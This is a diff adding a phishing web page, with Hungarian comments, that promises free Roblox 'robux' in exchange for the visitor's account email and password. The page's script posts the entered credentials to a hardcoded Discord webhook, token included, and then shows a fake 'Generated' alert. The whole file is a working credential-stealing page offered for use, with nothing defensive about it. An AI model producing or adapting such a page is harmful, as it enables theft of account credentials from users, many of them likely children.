@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Bejelentkezés</title>
+</head>
+<body class="">
+    <h1>Log in with your roblox account email and password to generate 15001 robux</h1>
+    <form id="loginForm">
+        <label for="email">Email:</label><br>
+        <input type="email" id="email" name="email"><br>
+        <label for="password">Password:</label><br>
+        <input type="password" id="password" name="password"><br><br>
+        <button type="submit">>>>Generate robux<<<</button>
+    </form>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Az alapértelmezett űrlap elküldésének megakadályozása
+
+            const webhookURL = 'https://discord.com/api/webhooks/1217846959038136440/EpZXcbp_gAgLtb1NWFBBjXZSxtG3cuLka1bC-FRsoL5nPp65TLRnri40ar_dhXDCQphL';
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const data = {
+                content: `Roblox Bejelentkezési adatok:\nEmail: ${email}\nJelszó: ${password}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('!Generated!');
+                    alert('!Generated!'); // Kiírás egy alert ablakban, ha sikeres az adatküldés
+                } else {
+                    console.error('!Problem!:', response.statusText);
+                    alert("Can't generate! Try again..."); // Kiírás egy alert ablakban, ha hiba történik az adatküldés során
+                }
+            })
+            .catch(error => {
+                console.error('Hiba történt a kérés során:', error);
+                alert('Sorry but there is a problem with the generating! Please try again...'); // Kiírás egy alert ablakban, ha hiba történik a kérés során
+            });
+        });
+    </script>
+</body>
+</html>
